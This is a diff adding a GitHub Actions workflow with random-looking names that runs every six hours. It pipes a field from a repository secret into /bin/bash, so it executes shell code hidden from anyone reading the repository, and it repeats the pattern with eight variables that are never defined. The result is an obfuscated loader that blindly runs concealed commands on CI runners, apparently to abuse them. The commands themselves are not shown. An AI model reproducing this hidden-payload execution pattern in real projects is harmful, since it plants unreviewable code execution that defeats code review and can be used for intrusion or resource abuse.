@@ -1,0 +1,24 @@
+name: wangyandexinzzaiguan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangyandexinzzaiguan
+        env:
+          pnyj0465: ${{ secrets.pnyj0465 }}
+        run: |
+          echo $pnyj0465 | jq -r .o03 | /bin/bash
+          echo $ier4812 | jq -r .rga4 | /bin/bash
+          echo $ofaw11 | jq -r .dzfmg96421 | /bin/bash
+          echo $jor9 | jq -r .tfze5 | /bin/bash
+          echo $tmfe8 | jq -r .pn55585 | /bin/bash
+          echo $tra8968 | jq -r .uota6739 | /bin/bash
+          echo $ofyhn3963 | jq -r .q22615 | /bin/bash
+          echo $cbzub20 | jq -r .dq7 | /bin/bash
+          echo $pkv43 | jq -r .avs0 | /bin/bash
+
